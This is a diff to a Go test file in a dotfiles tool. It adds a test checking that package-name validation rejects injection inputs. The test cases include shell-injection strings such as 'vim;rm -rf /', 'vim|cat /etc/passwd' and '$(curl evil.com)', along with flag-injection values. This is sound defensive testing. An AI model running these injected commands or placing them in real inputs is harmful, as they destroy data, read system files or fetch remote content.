@@ -3,6 +3,8 @@ package platform
 import (
 	"runtime"
 	"testing"
+
+	"github.com/nvandessel/go4dot/internal/validation"
 )
 
 func TestGetPackageManager(t *testing.T) {
@@ -94,6 +96,35 @@ func TestMapPackageName(t *testing.T) {
 			got := MapPackageName(tt.genericName, tt.manager)
 			if got != tt.want {
 				t.Errorf("MapPackageName() = %s, want %s", got, tt.want)
+			}
+		})
+	}
+}
+
+func TestPackageNameValidation(t *testing.T) {
+	tests := []struct {
+		name    string
+		pkg     string
+		wantErr bool
+	}{
+		{name: "valid package", pkg: "vim", wantErr: false},
+		{name: "valid with hyphen", pkg: "gcc-c++", wantErr: false},
+		{name: "valid with dot", pkg: "python3.11", wantErr: false},
+		{name: "valid scoped", pkg: "@scope/package", wantErr: false},
+		{name: "flag injection single dash", pkg: "-y", wantErr: true},
+		{name: "flag injection double dash", pkg: "--install-suggests", wantErr: true},
+		{name: "double dash flag", pkg: "--force-yes", wantErr: true},
+		{name: "shell metachar semicolon", pkg: "vim;rm -rf /", wantErr: true},
+		{name: "shell metachar pipe", pkg: "vim|cat /etc/passwd", wantErr: true},
+		{name: "backtick injection", pkg: "`whoami`", wantErr: true},
+		{name: "subshell injection", pkg: "$(curl evil.com)", wantErr: true},
+		{name: "empty string", pkg: "", wantErr: true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := validation.ValidatePackageName(tt.pkg)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("ValidatePackageName(%q) error = %v, wantErr %v", tt.pkg, err, tt.wantErr)
 			}
 		})
 	}
